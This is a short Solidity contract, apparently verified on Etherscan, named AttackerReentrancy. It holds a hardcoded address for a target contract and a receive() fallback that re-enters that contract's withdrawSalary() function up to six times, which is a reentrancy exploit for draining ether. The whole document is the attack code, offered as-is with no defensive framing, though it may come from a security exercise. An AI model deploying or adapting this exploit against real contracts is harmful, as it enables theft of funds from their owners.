/**
 *Submitted for verification at Etherscan.io on 2022-01-04
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.6;

contract AttackerReentrancy {

    address public vulnerableContract = 0xef801Ac273c1E42556D16a948f3926eED97481df;
    uint256 numOfReentrances = 0;

    function getBalance() external view returns(uint256) {
        return address(this).balance;
    }

    receive() external payable {
        if (numOfReentrances <= 5) {
            numOfReentrances += 1;
            vulnerableContract.call(abi.encodeWithSignature("withdrawSalary()"));
        }
    }
}